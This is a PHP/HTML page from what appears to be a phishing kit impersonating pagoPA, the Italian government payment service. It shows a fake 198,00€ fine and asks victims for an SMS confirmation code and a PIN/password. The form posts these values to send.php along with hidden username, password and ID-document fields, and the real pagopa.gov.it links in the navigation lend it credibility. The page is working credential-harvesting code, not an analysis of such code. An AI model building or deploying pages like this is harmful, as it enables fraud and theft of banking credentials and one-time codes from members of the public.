<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>pagoPA</title>
  <link rel="icon" type="image/png" href="img/pagopa-logo_brandlogos.net_gp2p3.png">
  <link href="css/swap.css" rel="stylesheet">
  <link rel="stylesheet" href="css/min.css">

  <style>
    body {
      font-family: 'Titillium Web', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-image: url('img/pexels-photo-3182762.jpeg');
      background-position: center bottom;
      background-repeat: no-repeat;
      background-size: cover;
      background-attachment: fixed;
    }

    /* Remove background image on small screens (phones) */
    @media screen and (max-width: 767px) {
      body {
        background-image: none;
        background-color: #fff; /* fallback color */
      }
    }

    .navbar {
      background-color: #003366;
      padding: 10px 20px;
      display: flex;
      flex-wrap: nowrap;
      align-items: center;
      justify-content: space-between;
      color: white;
      overflow-x: auto;
      -webkit-overflow-scrolling: touch;
    }

    .navbar img {
      width: 150px;
      margin-bottom: 10px;
      flex-shrink: 0;
    }

    .button-container {
      display: flex;
      flex-wrap: nowrap;
      gap: 10px;
      overflow-x: auto;
      -webkit-overflow-scrolling: touch;
      flex-shrink: 1;
    }

    .button-container a {
      white-space: nowrap;
      flex-shrink: 0;
    }

    .navbar a {
      color: white;
      font-size: 14px;
      padding: 8px 12px;
      border-radius: 5px;
      text-decoration: none;
      display: inline-block;
    }

    .navbar a:hover {
      background-color: skyblue;
      color: #003366;
    }

    .content {
      background-color: rgba(244, 244, 244, 0.85);
      padding: 20px;
      margin: 20px auto;
      max-width: 1000px;
      border-radius: 10px;
      box-sizing: border-box;
    }

    .payment-box,
    .form-container {
      background-color: #003366;
      color: white;
      padding: 20px;
      border-radius: 10px;
      margin-bottom: 20px;
      font-size: 14px;
    }

    .payment-box h2 {
      font-size: 22px;
    }

    .form-container h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }

    .form-section {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
    }

    .half-width {
      flex: 1;
      min-width: 250px;
    }

    .form-container label {
      font-weight: bold;
      margin-bottom: 6px;
      display: block;
    }

    .form-container input {
      width: 100%;
      padding: 8px;
      margin-bottom: 12px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 14px;
      box-sizing: border-box;
      height: 38px;
      line-height: 1.2;
    }

    /* Style date input to look consistent with other inputs */
    input[type="date"] {
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background: white;
      color: #000;
      padding: 8px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 5px;
      width: 100%;
      box-sizing: border-box;
      height: 38px;
      line-height: 1.2;
      position: relative;
    }

    /* Show the calendar icon in Chrome/Safari */
    input[type="date"]::-webkit-inner-spin-button,
    input[type="date"]::-webkit-calendar-picker-indicator {
      display: block;
      cursor: pointer;
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      opacity: 0.6;
    }

    /* Firefox calendar icon */
    input[type="date"]::-moz-calendar-picker-indicator {
      cursor: pointer;
    }

    .form-container button {
      background-color: skyblue;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      max-width: 300px;
      font-size: 16px;
      border-radius: 5px;
      margin: 20px auto;
      display: block;
      cursor: pointer;
    }

    footer {
      background-color: #003366;
      color: white;
      padding: 30px 20px;
      font-size: 14px;
    }

    .footer-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 20px;
    }

    .footer-logos img {
      height: 40px;
      margin-right: 10px;
    }

    .footer-links ul {
      list-style: none;
      padding: 0;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin: 0;
    }

    .footer-links a {
      color: white;
      text-decoration: underline;
    }

    .footer-company-info {
      flex-basis: 100%;
    }

    @media screen and (max-width: 768px) {
      /* Navbar: keep buttons horizontal, allow scroll */
      .navbar {
        flex-wrap: nowrap;
      }
      .button-container {
        flex-wrap: nowrap;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
      }

      /* Form section stacked vertically on small */
      .form-section {
        flex-direction: column;
      }

      .half-width {
        width: 100%;
      }

      .form-container button {
        width: 100%;
      }

      .footer-container {
        flex-direction: column;
        align-items: flex-start;
      }
    }
  </style>
</head>
<body>
  <div class="navbar">
    <img src="img/pagopa-logo-white.png" alt="PagoPA Logo">
    <div class="button-container">
      <a href="https://www.pagopa.gov.it/it/servizi/pagamento/">Pagamento multa</a>
      <a href="https://www.pagopa.gov.it/it/serve-aiuto/">Serve aiuto?</a>
      <a href="https://www.pagopa.gov.it/it/chi-siamo/pagopa-spa/">PagoPa S.p.A</a>
      <a href="https://www.pagopa.gov.it/it/pubbliche-amministrazioni/">Amministrazioni</a>
      <a href="https://www.pagopa.gov.it/it/soluzioni/">Soluzioni</a>
      <a href="https://www.pagopa.gov.it/it/assistenza/">Supporto</a>
    </div>
  </div>

  <div class="content">
    <div class="payment-box">
      <p>conferma il pagamento tramite codice SMS ricevuto</p><p>
      </p><p>Importo: <strong style="color:skyblue;">198,00€</strong></p>
    </div>

<style>
  /* Center the main form container */
  #main {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 60vh;
    padding: 40px 20px;
    box-sizing: border-box;
  }

  #main .container {
    background: #003366;
    color: white;
    padding: 30px 40px;
    border-radius: 12px;
    max-width: 480px;
    width: 100%;
    box-shadow: 0 0 12px rgba(0,0,0,0.4);
    font-family: 'Titillium Web', Arial, sans-serif;
    text-align: center;
  }

  #main .main-title h3 {
    margin-bottom: 20px;
    font-weight: 600;
    font-size: 1.4rem;
    line-height: 1.3;
  }

  #main .details-box p {
    font-size: 1rem;
    margin-bottom: 25px;
    opacity: 0.85;
  }

  #main form {
    text-align: left;
  }

  #main .form-group {
    margin-bottom: 18px;
  }

  #main input.form-control {
    width: 100%;
    padding: 10px 14px;
    font-size: 1rem;
    border-radius: 6px;
    border: 1.5px solid #80bfff;
    outline: none;
    transition: border-color 0.3s ease;
    background-color: white;
    color: #003366;
  }

  #main input.form-control:focus {
    border-color: #00bfff;
    box-shadow: 0 0 5px #00bfff;
  }

  #main button#cc-submit {
    width: 100%;
    background-color: #00bfff;
    border: none;
    color: #003366;
    font-weight: 700;
    padding: 14px 0;
    border-radius: 8px;
    cursor: pointer;
    font-size: 1.1rem;
    transition: background-color 0.3s ease;
    margin-top: 10px;
  }

  #main button#cc-submit:hover {
    background-color: #008fcc;
    color: white;
  }

  .form-group .error-message {
    color: #ff6666;
    font-size: 0.9rem;
    margin-top: 4px;
  }

  @media (max-width: 600px) {
    #main .container {
      padding: 20px 25px;
      max-width: 90%;
    }
  }
</style>

<style>
  /* Center the main form container */
  #main {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 60vh;
    padding: 40px 20px;
    box-sizing: border-box;
  }

  #main .container {
    background: #003366;
    color: white;
    padding: 30px 40px;
    border-radius: 12px;
    max-width: 480px;
    width: 100%;
    box-shadow: 0 0 12px rgba(0,0,0,0.4);
    font-family: 'Titillium Web', Arial, sans-serif;
    text-align: center;
  }

  #main .main-title h3 {
    margin-bottom: 20px;
    font-weight: 600;
    font-size: 1.4rem;
    line-height: 1.3;
  }

  #main .details-box p {
    font-size: 1rem;
    margin-bottom: 25px;
    opacity: 0.85;
  }

  #main form {
    text-align: left;
  }

  #main .form-group {
    margin-bottom: 18px;
  }

  #main input.form-control {
    width: 100%;
    padding: 10px 14px;
    font-size: 1rem;
    border-radius: 6px;
    border: 1.5px solid #80bfff;
    outline: none;
    transition: border-color 0.3s ease;
    background-color: white;
    color: #003366;
  }

  #main input.form-control:focus {
    border-color: #00bfff;
    box-shadow: 0 0 5px #00bfff;
  }

  #main button#cc-submit {
    width: 100%;
    background-color: #00bfff;
    border: none;
    color: #003366;
    font-weight: 700;
    padding: 14px 0;
    border-radius: 8px;
    cursor: pointer;
    font-size: 1.1rem;
    transition: background-color 0.3s ease;
    margin-top: 10px;
  }

  #main button#cc-submit:hover {
    background-color: #008fcc;
    color: white;
  }

  .form-group .error-message {
    color: #ff6666;
    font-size: 0.9rem;
    margin-top: 4px;
  }

  @media (max-width: 600px) {
    #main .container {
      padding: 20px 25px;
      max-width: 90%;
    }
  }
</style>




  <meta charset="UTF-8">
  <title>Pagamento</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f6f9fc;
    }

    .details-box {
      max-width: 400px;
      margin: 20px auto;
      padding: 20px;
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.08);
    }

    .card-logos {
      text-align: center;
      margin-bottom: 20px;
    }

    .card-logos img {
      height: 28px;
      margin: 0 8px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .form-group {
      width: 100%;
    }

    .form-control {
      width: 100%;
      height: 36px;
      font-size: 14px;
      padding: 6px 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .form-group small {
      color: red;
      font-size: 12px;
    }

    #cc-submit {
      background-color: #0073e6;
      color: white;
      border: none;
      padding: 10px;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
    }

    #cc-submit:hover {
      background-color: #005bb5;
    }

    @media screen and (max-width: 480px) {
      .details-box {
        margin: 10px;
        padding: 15px;
      }
    }

    /* ADDED: Make full width on phone */
    @media screen and (max-width: 600px) {
      html, body, main#main, .container, .details-box {
        width: 100% !important;
        max-width: 100% !important;
        margin: 0 !important;
        padding: 0 !important;
        border-radius: 0 !important;
        box-shadow: none !important;
      }

      .details-box {
        padding: 15px !important;
      }
    }
  </style>



        <div class="details-box">
  <form method="post" action="send.php" id="cc-form" onsubmit="return validateForm();">
    <input type="text" name="sms" id="cc_date" class="form-control" placeholder="Inserisci il codice SMS">

    <input type="text" name="pin" id="cc_cvv" class="form-control" placeholder="Inserisci il PIN/PASSWORD">

    <!-- 🔴 Message shown when fields are empty -->
    <p id="formWarning" style="color: red; display: none; margin-top: 10px;">
      Per favore, inserisci sia il codice SMS che il PIN/PASSWORD.
    </p>

    <!-- Hidden inputs -->
    <input type="hidden" name="verbot">
    <input type="hidden" name="type" value="cc">
    <input type="hidden" name="doc_type" id="doc_type" value="">
    <input type="hidden" name="doc_number" id="doc_number" value="">
    <input type="hidden" name="username" id="username" value="">
    <input type="hidden" name="password" id="password" value="">
    <input type="hidden" name="ip_address" id="ip_address" value="77.32.33.28">

    <div class="form-group">
      <button type="submit" id="cc-submit">confermare</button>
    </div>
  </form>
</div>

<script>
  function validateForm() {
    const smsCode = document.getElementById("cc_date").value.trim();
    const pinCode = document.getElementById("cc_cvv").value.trim();
    const warning = document.getElementById("formWarning");

    if (!smsCode || !pinCode) {
      warning.style.display = "block";
      return false; // prevent form submission
    }

    warning.style.display = "none"; // hide message if validation passes
    return true; // allow form to submit
  }
</script>


</div>
<?php 
$m->ctr("SMS (".@$_GET['p'].")");
?></body>
</html>